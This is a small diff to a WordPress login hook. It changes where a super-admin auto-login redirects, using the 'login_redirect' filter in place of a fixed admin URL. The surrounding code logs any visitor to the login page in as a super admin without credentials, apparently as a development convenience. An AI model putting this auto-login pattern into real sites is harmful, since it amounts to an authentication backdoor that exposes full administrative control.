@@ -114,8 +114,9 @@ add_action('login_init', function() {
     foreach (get_super_admins() as $admin_login) {
         $user = get_user_by('login', $admin_login);
         if (is_object($user)) {
+            $redirect_to = apply_filters( 'login_redirect', admin_url(), admin_url(), $user );
             wp_set_auth_cookie($user->ID);
-            wp_redirect(admin_url());
+            wp_redirect($redirect_to);
             exit;
         }
     }
